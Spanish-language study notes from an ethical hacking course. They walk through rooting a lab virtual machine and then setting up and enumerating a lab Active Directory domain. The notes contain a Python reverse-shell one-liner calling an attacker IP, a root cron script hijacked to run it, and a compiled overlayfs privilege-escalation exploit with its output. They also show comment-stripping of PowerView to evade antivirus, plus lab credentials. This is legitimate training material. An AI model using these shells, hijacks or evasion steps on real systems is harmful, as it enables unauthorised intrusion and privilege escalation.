
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Aug 13 01:14:09 2014 from 10.0.0.12
Could not chdir to home directory /home/overflow: No such file or directory
$ 
Y ya estariamos conectados.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Podemos navegar y ver que encontramos, pero nos encontramos con un problema, somos usuarios sin provilegios

Ahora mismo el sstema de la maquina victima la maquina troll nos saca periodicamente, esto se debe a un crono
que practicamente sea un servicio abierto que este corriendo

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
los logs donde se encuentran las sessiones de los servicios abierto, usados etc
esta en /var/log
luego de un cd /var/log/ encontraremos cronlog
dentro de este encontramos un fichero que cada cierto tiempo ejecuta un archivo.py

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Forma de buscar un archivo en ubuntu

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
find . -name archivo.x
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

luego aplicamos este comando en el archivo que encontramos en cronlog

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
$ cd /var/log
$ ls
alternatives.log  auth.log       btmp          dmesg       dmesg.2.gz  dpkg.log      
fsck       lastlog   udev                       vsftpd.log
apache2           boot.log       cronlog       dmesg.0     dmesg.3.gz  fail2ban.log  
installer  syslog    upstart                    wtmp
apt               bootstrap.log  dist-upgrade  dmesg.1.gz  dmesg.4.gz  faillog       kern.log   syslog.1  vmware-tools-upgrader.log
$ cat cronlog
*/2 * * * * cleaner.py

 find . name cleaner.py

./lib/log/cleaner.py
$ cat /lib/log/cleaner.py
#!/usr/bin/env python
import os
import sys
try:
        os.system('rm -r /tmp/* ')
except:
        sys.exit()
Nos dice que este fichero importa dos sistemas, luego borra todo en tmp y todo
lo posterior a este
luego vemos quien ejecuta esto con
ls -la /lib/log/cleaner.py
y nos dice que -rwxrwxrwx 1 root root 96 Aug 13  2014 /lib/log/cleaner.py
es quien ejecuta este comando     
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Luego recordamos haber visto el sistema de la maquina al conectarnos

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Ubuntu 14.04.1 LTS, bien pues, buscando en internet este tiene un fallo que es la elevacion de privilegios para ser exactos
Kernel de Linux 4.3.3 (Ubuntu 14.04/15.10) - Escalada de privilegios locales 'overlayfs' (1) para ser exactos
El archivo cleaner.py ejecuta en base al sistema y vemos quien lo ejecuta es un usuario root del sistema, podemos en este 
caso editar ese fichero para nuestra conveniencia.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Otra forma de hacerlo es buscando en el navegador un reverse para python: python reverse shell oneline site:github.com
En este repositorio encontre lo siguiente: python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

se debe de ajustar, solo lo usaremos primero para probar si funciona

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("maquina atacante",4242));os.dup2(s.fileno(),0)
;os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")

Y queda asi, debemos dentro de la maquina victima entrar a cd tmp, luego pico test.py e introducir el import anterior
pico es un editor de texto, el nombre para la prueba fue test.py
Abrimos otra terminal para escuchar netcat -lvp y el puerto qe dejamos en este caso 4242
luego ejecutamos en la maquina victima python test.py y si llega a escuchar estamos listo para continuar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Razones para trabajar dentro de tmp en linux

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Permisos de Escritura:

El directorio /tmp generalmente tiene permisos de escritura para todos los usuarios.
Esto facilita la creación y escritura de archivos temporales, lo cual es común al generar payloads para shell inverso.
Menos Restricciones de Permisos:

Otros directorios pueden tener restricciones de permisos más estrictas, lo que podría dificultar la 
creación de archivos temporales o ejecutables.
Limpieza Automática:

Muchos sistemas operativos limpian automáticamente el contenido del directorio /tmp periódicamente.
Esto puede ser beneficioso para ocultar rastros y minimizar la detección, ya que los archivos temporales utilizados
durante la creación del shell inverso pueden eliminarse automáticamente.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

En la maquina victima editamos con pico el fichero cleaner.py, para que ejecute nuestro import y guardamos al tener otra ventana escuchando al momento de
ejecutarce ya nos redireccionara como usuario root en la ventana donde escuchamos

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#!/usr/bin/env python
import os
import sys
try:
        import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.159.128",4242))
        ;os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup$
except:
        sys.exit()
Que quede asi, anteriormente veiamos esto os.system('rm -r /tmp/* ').
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Otra forma de elevar nuestro privilegio en la maquina es utilizando la vulnerabiliad de la maquina que hablamos anteriormente Ubuntu 14.04.1 LTS

Esta vez utilizaremos https://www.exploit-db.com/exploits/37292 esta pagina muestra el exploit en c, de las versiones de ubuntu vulnerables donde la nuestra esta presente
como esta en c lo debemos de compilar luego de pegar, no hay que modificar en este caso el exploit
Nos conectamos 


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ssh overflow@192.168.159.129
$cd /tmp
$pico exploit.c
$pegamos el exploit de la pagina
$ls
exploit.c
$ gcc exploit.c -o test2 > compilamos el fichero y -o para exportarlo, esta vez con el nombre test2
$ ./test2 > para ejecutar el exploit
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# whoami  > para confirmar nuestro privilegio dentro de la maquina
root
# cd root
sh: 2: cd: can't cd to root
# cd /root
# ls
proof.txt
# cat proof.txt
Good job, you did it! 

                                        > al final nos presenta dentro de la carpeta root un
                                        fichero que nos dice buen trabajo, llegamos a donde debimos
                                        y recordar que ya hicimos una explotacion si fuera una auditoria
                                        lo demas fue post-explotacion
                                        
702a8c18d29c6f3ca0d99ef5712bfbdc   > nos entrega un hash

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Formas de identificar un hash

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Mediante la pagina para ver las semejanzas o
 echo "702a8c18d29c6f3ca0d99ef5712bfbdc" | hash-identifier

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~




Active Directory video #26
Almacena informacion acerca de los recursos de una red y facilita su organizacion, busqueda y gestion
por parte de los usuarios y administradoes
Estos recursos suelen ser : servidores, impresoras, cuentas de usuarios, equipo de red, etc.

Para analizar en nmpa algo muy curioso para analizar maquinas que no esten dentro de la red sino en una subred

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
192.0.0.0/8
192.159.168.0/16
192.159.168.0/24
En casos extremadamente grandes y para facilitar el escaneo
es mejor utilizar masscan ej "sudo masscan -p1-65535 192.0.0.0/8 --rate 100000 
--interface eth0" interfaz de mis maquinas virtuales
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Pasos a crear nuestro directory dominio en windows servers, hacer que actue como un controlador de dominio video 27

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Cambiamos el nombre de nuestro equipo a DC01
cambiamos la direccion ip a una estatica en host only, tomamos el prefijo y el ultimo 0 lo cambiamos por un 5
la ip masc se colocara por defecto y en servidor dns preferido colocamos la ip host es decir 127.0.0.1
Luego en la ventana que presenta por defort de redes precionar administrar y agregar roles y caracterisitcas
Durante la instalacion en el cuarto paso seleccionar servicios de dominio active directory
Por ultimo marcar casilla de reiniciar e intalar
Luego de esto y haber reiniciado la maquina precionar proveer servicio, se nos presentara en la bandera arriba
Seguir los procedimientos,en nombre del dominio en mi caso coloque corp.local y contrasena @ng*Apolo
Las proximas veces que iniciemos seccion se abrira como cor/admnistrador.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Pagina para descargar maquinas de microsoft ya virtualizadas

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
windows iex virtual machine
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


-En esta parte en adelante veremos el uso de directorio de dominio como le daremos permisos a dos maquinas cuando deben de cambiar
sus claves, los permisos que cada una tendran, practicamente seremos el controlador a traves de nuestra maquina servers hacia
dos maquinas windows10. video 25 en adelante.
-colocar una ip fija para la maquina windows servers y dns en la configuracion de red ipv4 y la conectamos a la red host only creada,
esto se hace porque si la ip es dinamica y cambia a cada momento pues a cada momento tendremos que configurar la maquina 
y la de los usuarios con nuestra ip nueva,por esa razon le ponemos una estatica, en mi caso el prefijo que tenia es decir 
la misma ip los primeros 3 putnos luego el ultimo digito lo cambie por un 5, mientras que las demas ip de los usuarios debe de ser dinamica
muchas veces en la empresas se llevan el portatil a sus hogares y mas.
-Lo primero es que le cambiaremos los nombres a los equipos para reconocerla, en mi caso WS01 y WS02, en una empresa seria
mejor idea colocar el nombre de la posicion y la sucursal si es una empresa grande
-Luego de esto cree una ethernet host only, pero en las empresas tienen vpn o quizas deba de hacerlo como aqui
-Luego de crearla el adaptador #2 configuro para que todas las maquinas esten  conectadas a ella.
Cada maquina le debo de configurar el adaptador ipv4 en configuraciones y en el compartimiento de  dns colocar la ip de la maquina servers
-luego hacer que las dos maquinas tengas las 2 opciones de compartir entre maquinas en la opcion de uso compartido de la red

Ya configuradas ambas maquinas en la maquina servers dentro de la ventana de redes seleccionar la parte superior la opcion
herramienta, podemos encontrar dentro todas las configuraciones que le podemos hacer a los usuarios de nuestro dominio
mas opciones pero la primera que veremos es usuario donde podemos decir la fecha de que el usuario debera cambiar su contrasena.

Luego pasamos a crear 2 usuarios, en este caso sin ninguna especificaciones grandes, solo nombre de usuario y su contrasena y que la
contrasena nunca expire, guardo y luego de eso en cada maquina que creamos para esto las dos maquinas buscaran en el buscador
de su sistema agregarse a un trabajo, colocan el nombre del dominio que creamos que es corp.local , si al momento de crear dice
que no reconoce este dominio recuerda activar compartir red entre maquinas como lo hicimos anteriormente, en dado caso
un error comun que se desactive solo debemos de activar los siguientes servicios: cliente dns, dispositivo host de upnp y deteccion de ssdp

Una vez esto, nos dirigimos a agregar trabajo o escuela, anadimos nuestro dominio copr.loca luego ingresamos unos de los usuarios creados para WS01 empleado 1 y para WS02 empleado2 con la contrasena anteriormente creada dejamos el nombre y tipo de cuenta estandar, la maquina
pedira reiniciar y al subir veremos que solo tiene y existe el usuario creado, lo demas ya no esta.

Toda la informacion se encuentran en la direccion al momento de crear el dominio corp.local, en c:windows/NTDS 
y algo muy importante la base de datos de todo se llama ntds.dit

Ya una vez todo listo, la mayor parte del administrador de active directory se basa en herramientas exactamente en usuarios y active directory
y la administracion de directiva de grupo

Dentro de herramienta en el apartade de usuario que mencionamos anteriormente, creamos usuario de una forma mas especifica que la anterior vez con menos opciones, al igual que grupos, algo con los grupos al momento de crearlo en tipo de grupo existe 2 tipos, seguridad para aplicar politicas sobre ellos y distribuccion que es para agrupar una lista de usuarios para enviar correos, esto ultimo lo podemos hacer para crear una lista de mensajes alertas por ejemplo o lo que la empresa utilice, al lado de esto tendremos abito de grupo con:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"Domain Local"

Definición: Los grupos de ámbito de dominio local se utilizan para asignar permisos y 
derechos dentro de un solo dominio de Active Directory.
Uso: Se pueden utilizar para asignar permisos a recursos dentro del mismo dominio.
Limitación: Su alcance se limita al dominio en el que se crean.

"Global"

Definición: Los grupos de ámbito global se utilizan para agrupar usuarios de varios dominios
y asignarles permisos en cualquier dominio del bosque.
Uso: Suelen emplearse para asignar permisos en recursos que abarcan varios dominios.
Limitación: No pueden utilizarse directamente para asignar permisos a recursos locales 
dentro de un dominio específico.

"Universal"

Definición: Los grupos de ámbito universal son similares a los grupos globales, pero tienen
un alcance más amplio ya que pueden atravesar múltiples dominios en un bosque.
Uso: Se utilizan cuando necesitas agrupar usuarios y asignar permisos que abarcan varios
dominios en un bosque de Active Directory.
Limitación: Pueden generar una carga adicional 
en la replicación de Active Directory, por lo que se deben usar con precaución y solo cuando sea necesario.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Ahora pasamos a la segunda mas usada administracion de directiva de grupo

Lugar donde aplicaremos politicas a los objetos, recordar que todo es un objeto obviando los cotenedores vacios explicado en el video 28

Dentro en la sub carpeta objetos de directiva de grupo aqui se encuentran las politicas por defecto que son dos.

Para crear tal, en el copartimiento que creamos llamado TestDep y pasamos a los usuarios del compartimiento users a este , click izquierdo crear GPO en este caso haremos una politica que cuando el usuario inicie secion se ejecute un script. Una vez creada y vemos que se ubica donde la creamos y con las demas que estan por default, precionamos click izquierdo y editar .

Una cosa importante, las politicas se pueden aplicar tanto como a equipo o usuario, tenerlo en cuenta. una politica a una no afecta a la otra

Al igual que el tipo de politica, se encuentras las directivas las que se ejecutaran si o si aunque el usuario se oponga y las preferencias donde por ejemplo diremos que el escritorio sea de x forma pero que el usuario pueda modificar, esta es mas flexible.

En este caso crearemos una politica dentro de usuarios, especificamente en configuracion de windows: script de inicio de seccion. 

Para este ejemplo creare un notepad, dentro de el calc.exe, esto por supuesto es para ejecutar una calculadora, lo guardo como para todo tipo de archivos y a la salida script.bat

Dentro de la  configuracion de windows: script de inicio de seccion. 
abrir archivos pegamos nuestro archivo script.bat en la carpeta hacia donde nos dirige y agregagamos el mismo archivo, ya todo aplicado y guardado estara listo. cuando el o los usuarios dentro de TestDep reinicien , abran o cierren seccion se les abrira la calculadora

Otra cosa que haremos en crear carpetas de archivos compartidos
este se encuentra en la interfaz de administrador de servidor a la izquierda en sevricios de archivos, luego recurcos compartidos
, en la pestana de la derecha arriba ‘Tarea’ crear carpteta compartida, al momento de crear nos preguntara el nombre, ubicacion
, quien poodra acceder y los permisos que podran tener a quien se los comparta, esto funciona como brecha para que cualquier 
recurso que desee compartir le aparezca a la otra maquina en esa carpeta, en este ejemplo la llame departamental, en la maquina
servers se encuentra en la carpeta C:\share pero en las demas maquinas para acceder a ella al momento de crear no los dice
en este caso \\DC01\departamental esta direccion se debe de colocar en el explorador de archivos de x usuario.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
A:\Downloads\Cursos\Curso avanzado de Hacking Etico y Ciberseguridad\Seccion 4\Screenshot 2024-03-08 174010.png
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

DC01 nuestro nombre de equipo en el servers y departamental el nombre de la carpeta compartida que hemos creado

Hacemos lo mismo con el script anterior en este caso el comando seria net use t: \\192.168.0.5\departamental
esto hara que todos los usuarios enlazados a nuestro compartimiento TestDep tendran otra unidad otro disco duro llama 
departamental donde se ubicara la carpeta compartida. con la letra de unidad t.

De igual forma podemos entrar a los demas recursos compartido \\DC01\Users, SYSVOL etc, tenerlo en cuenta
Otra cosa en el nombre de nuestro script, por ejemplo para que el ususario entre a la carpeta compartida se representa
{4089EC81-0800-4ADC-BA5E-BA13C228E60C}, esto es para tenerlo en cuenta e ingresemos a SYSVOL en su subcarpeta policy
veremos nuestras politicas creadas con este identificador.

Otra cosa que veremos mucho, y es una casilla que dice que es para proteger por si se elimina de forma accidental,
dentro de por ejemplo usuario y equipo de active directory debemos de activar caracteristicas especiales en la pestana ver
y luego seleccionar propiedades de lo que queremos eliminar y en la pestana objeto desmarcar esta casilla,
lo realice contra TestDep y movi todo de nuevo a usuario e elimine empleado3.

Bien ya con los conocimientos previos podemos comenzar a buscar o explotar una vulnerabilidad en sistemas similares,
ya que si una empresa nos contrata ya sea aditoria interna o externa deberemos de buscar en este tipo de sistemas
vulnerabilidades y tratar de sacar o exponer informaicon, como usuarios, grupos, privilegios GPO etc video 31


Bien ahora pasaremos a realizar una auditoria a la infraestructura del dominio utilizando la herramienta powerview en kali linux
Esto seria como si nos dicen que lo hagamos sin sus equipo con o sin credenciales o tambien no facilita una maquina de usuario
comun sin privilegios.

Primero creamos una GPO una politica a nivel de equipos en la directiva para que las demas maquinas de usuarios WS01 y WS02
puedan ejecutar script en powershell,.
Al momento de editar nuestra politica llamada Script execution Policy nos dirigimos a directivas, plantillas administrativas, windows powershell, ya dentro de las subcarpetas elegimos la opcion de activar la ejecucion de scripts, habilitamos y debajo que se ejecute a los usuarios y de forma remota firmado, aplicamos y listo.

Ya una vez realizado esto las maquinas se deben de reiniciar ya que fue una politica hacia el equipo, ahora nos dirigimos a la maquina kali linux y utiizar la herramienta PowerView

Descargamos en kali el repositorio llamada powersploit, movemos con cp luego de descomprimir el archivo dentro de recon PowerView.ps1
Hare dos purebas una con power shell y otra con la herramienta, ya que muchas veces estas son detectadas, usare la misma maquina WS02
para hacer ambas pruebas

Lo siguiente sera crear un servidor en kali http para pasar un fichero (el descargado) hacia la maquina del empleado 1 (WS01)
la direccion del termianl debe de estar en donde esta el archivo antes de ingresar el siguiente comando

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
python2 -m SimpleHTTPServer
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Luego en la maquina donde queremos recibir el archivo en este caso WS01

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
(New-Object System.NET.WebClient).DownloadFile("http://192.168.0.5:8000/PowerView.ps1", "powerview.ps1")  
ip de la maquina kali linux donde esta el archivo mas el nombre del archivo y luego la salida de este
en este caso fue colocado el mismo nombre pero todo en minuscula.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Si ne requiere cambiar la ip de la maquina server, primero se cambia el dns de los usuarios y luego la ip estatica del administrador server
Ya que si la ip de windows servers en este caso es diferente al dns del usuario dentro del dominio las credenciales de administrador
para realizar algun cambio no tendran efecto.

Para ejecutar el script que es el archivo pasado es:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
. .\powerview.ps1
en mi caso se llama new_powerview.ps1
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Obviamente el antivirus de windows lo detecta como una herramienta de ataque, porque en su base de datos posee la firma de esta herramienta
y la reconoce como tal, pero es algo tan sencillo como cambiar,editar la firma de este archivo para que el antivirus lo detecte como otro archivo
y no los permita

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sed '/<#/,/#>/d' PowerView.ps1 > new_powerview.ps1
aqui le digo, borrame todos los comentarios del archivo y creamos
otro archivo llamado new_powerview.ps1 sin comentarios..
sed es una herramienta para editar archivos, d se utiliza para borrar y r para anadir
un archivo a tu archivo y a\ anade despues de \ el texto que desees.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

En mi caso descargue otro en kali linux, pegue el comando de este ya que el que descargue tenia varios errores de escritura
y utilice para eliminar la firma 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-Content "C:\Users\empleado2\Desktop\PowerView.ps1" | Where-Object {$_ -notmatch '<#' -and $_ -notmatch '#>'} | Set-Content "C:\Users\empleado2\Desktop\new2_powerview.ps1"   
Con esto elimine la firma, pegue el codigo del otro que si estaba bien y este el antivirus no lo detecto
tomar en cuenta que se debe de colocar la exrension el .ps1 en mi caso en el escritorio no lo presenta
y si coloco el comando sin la extension no funcionara.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


En mi caso desactive el firewall, este si estaba completo y aun asi lo detecto, pero no esta demas intentarlo

una vez ejecutado pasamos a enumerar SAM
En esta parte haremos la explotacion o recopilacion de informacion a traves de la maquina de un usuario del dominio

Lista de comando en maquina de usuario dentro de dominio sin necesidad de privilegios

Para ver todos los usuarios

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
net user /domain
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Para ver los grupos

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
net group /domain
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
net user <nombre_usuario>: Te permite ver la información de un usuario específico 
en el dominio, como su nombre completo, descripción, última fecha de cambio de contraseña, etc.

net user: Si se ejecuta sin argumentos, este comando mostrará la lista de usuarios en el dominio.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Para ver como se llama nuestro usuario de la maquina presentada por la empresa
Tambien funciona para cuando compremetemos la maquina y la explotamos de forma remota

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
$env:UserName
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Para ver el dominio

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
$env:UserDomain
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Develve el nombre del servidor

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
$env:LOGONSERVER
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Devuelve la ruta del usuario actual

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
$env:USERPROFILE
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Nombre del equipo 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
$env:ComputerName
o
whoami que conocemos, nos entrega el nombre del equipo, seguido por el nombre de usuario   
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Despues de ejecutar la herramienta . .\new_powerview.ps1

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
GET-NetLocalGroup
Esto nos mostrara todos los grupos del dominio local

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Otra funcion seria preguntar cuales accesos o limites tiene nuestro ususario empleado1

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-NetGroup -UserName "empleado1" | select name
diremos que selecione la ventana name dentro de los
usernmae y que vea empleado1
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Para saber cuales usuarios si son administradores

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-NetLocalGroupMember -GroupName Administradores | Select-Object
MemberName, IsGroup, IsDomain
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Aqui le dire que estraiga el grupo de nombres administradoes y que seleccione las 
siguientes casillas, nombre de miembro, y los is


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-NetLocalGroupMember -GroupName Administradores | Select-Object MemberName, IsGroup, IsDomain 
MemberName               IsGroup IsDomain 
WS01\Administrador         False    False
WS01\Kali                  False    False
CORP\Admins. del dominio    True     True
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Con esta informacion podemos saber cual es el dominio que tiene acceso total en este caso el 3ro pero en nuestra misma maquina
vemos que existe un usuario administrador con el cual si nos apropiamos de el podremos tener acceso a la base de datos que se 
encuentra el el usuario de administrador de  active directory. y que si intentamos ver las demas maquinas quizas si estan
mal configuradas tambien tengan las mismas contrasenas.

Sin la herramienta powerview, podemos realizar las mismas busquedas en powershell, recordad que esta herramienta se basa en esta terminal

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-LocalGroup | Select Name, Objectclass, Principalsource, sid
Hara la misma funcion que
Get-NetGroup -UserName "empleado1" | select description
esto me mostrara todos los grupos del dominio
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Y para saber los grupos administradores del equipo

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-LocalGroupMember -Group Administradores
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Para saber el nombre de mi dominio

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
(Get-WmiObject Win32_ComputerSystem).Domain
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Para tener toda la informacion del dominio, maquinas aledanas a ella, sistema operativo, fecha de expiracion, todo.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-NetComputer -Domain <NombreDelDominioDestino>
en mi caso
Get-NetComputer -Domain corp.local
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Mas funciones de la herramienta powerview

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
https://powersploit.readthedocs.io/en/latest/Recon/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Otra forma de usar la herramienta powerview
Con un comando que necesita ser administrador, paso a anadir al grupo de administradores a empleado1 en la maquina servers, herramienta, usuario  y grupo
empleado1, click derecho propiedades, miembro de y anadirlo al grupo de administradores de dominio

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Get-NetLocalGroup -ComputerName WS02 
 le decimos que aplique esto en base a la informacion 
 de empleado2(WS02) dentro del dominio
 espefificamente enumera los grupos de WS02 de forma remota
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Ahora podemos pasar tambien a wireshark en nuestra maquina host, una ves ejecutado elegir nuestra red creada en host-only para su capture
es una ventaja tener esta red virtual ya que acaparemos todo lo que hacemos dentro de una red solamente nuestras maquinas con la que trabajamos
En mi caso utilce snort para ver el ip de la red creada y luego seleccionar la red en wireshark, una vez ejecutado el comando en empleado1
veremos su trafico 

El mismo comando anterior para la informacion de WS02 pero sin powerview, siendo administradores

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Invoke-Command -ScriptBlock { Get-LocalGroupMember -Group Administradores } -ComputerName WS02
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Otro comando pero para saber cuales maquinas estan logeadas, con la herramienta powerview

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-NetLogged
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Para ver las secciones de nuestra maquina

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-NetSession
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Para entrar desde nuestra maquina administrador hacia otra maquina de usuario

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\\WS01\C$
o desde la terminal dir \\WS01\C$
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


En dado caso que la maquina con acceso a estas carpetas compartidas con el comando get-netsession podemos ver la informacion de la maquina

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
CName        : \\192.168.0.7
UserName     : Administrador
Time         : 157
IdleTime     : 118
ComputerName : localhost

CName        : \\[::1]
UserName     : empleado1
Time         : 2
IdleTime     : 0
ComputerName : localhost
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Como podemos ver si comprometemos la maquina administrador ya tendremos acceso a todo

Tener en cuenta que todos los comandos aqui usados solo funcionan en wndows servers 2016 hacia atras

Saber las maquinas del dominio, acceso de administrador

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-ADComputer -Filter * | Select-Object Name,OperatingSystem

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Para verificar si mi usuario es administrador en el dominio, sin herramienta, sin permisos

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
([Security.Principal.WindowsIdentity]::GetCurrent()).Groups | ForEach-Object { $_.Translate([Security.Principal.NTAccount]) } | Select-Object Value
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Cuenta de administrador

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Value                                                 
-----                                                 
CORP\Usuarios del dominio                             
Todos                                                 
BUILTIN\Administradores                               
BUILTIN\Usuarios                                      
BUILTIN\Acceso compatible con versiones anteriores de NT AUTHORITY\INTERACTIVE                              
INICIO DE SESIÓN EN LA CONSOLA                        
NT AUTHORITY\Usuarios autentificados                  
NT AUTHORITY\Esta compañía                            
LOCAL                                                 
CORP\Admins. del dominio                              
CORP\Propietarios del creador de directivas de grupo  
CORP\Administradores de empresas                      
CORP\Administradores de esquema                       
Identidad afirmada de la autoridad de autenticación   
CORP\Grupo de replicación de contraseña RODC denegada 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Cuenta normal 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Value                                                                                 
-----                                                                                 
CORP\Usuarios del dominio                                                             
Todos                                                                                
BUILTIN\Usuarios                                                                     
NT AUTHORITY\INTERACTIVE                                                              
INICIO DE SESIÓN EN LA CONSOLA                                                        
NT AUTHORITY\Usuarios autentificados                                                  
NT AUTHORITY\Esta compañía                                                            
LOCAL                                                                                 
Identidad afirmada de la autoridad de autenticación  
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


En esta ocasion trabajaremos desde kali linux para enumerar las SAM de la maquina WS01 empleado1
Siempre es recomendable para que kali trabaje en tareas de hacks en active directory configurar nuestro dns como domain control de la infraestructura, porque a la hora por ejemplo de decir ping WS01.corp.local no lo leera
No vamos a settings, luego advanced network, pulsamos sobre nuestra coneccion, precionamos en opciones o la rueda debajo,
luego pulsamos en ipv4 luego metodo y elegimos la opcion de solo que nos muestre la ip sin DHCP(only) y en dns server colocar la ip de la maquina 
server domain que es la maquina administradora de dominio que anteriormente pudimos ver, en este caso 192.168.0.7

Realizamos luego ping WS01.corp.local y ahora si recibiremos paquetes y devuelta, cabe destacar que siempre la maquinacontrolador de dominio que es a la que llamo mauqina server admin, debe de estar encendida. y WS01.corp.local es el nombre de dominio que tiene la maquina WS01.

Unas de las herramientas a utilizar en kali para el ataque es ‘rpcclient’

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
rpcclient -U "corp\empleado1%@ng01*Apolo" WS01.corp.local
-U para decir que necesita usuario y luego le pasamos las
credenciales de la maquina a ingresar y luego su nombre
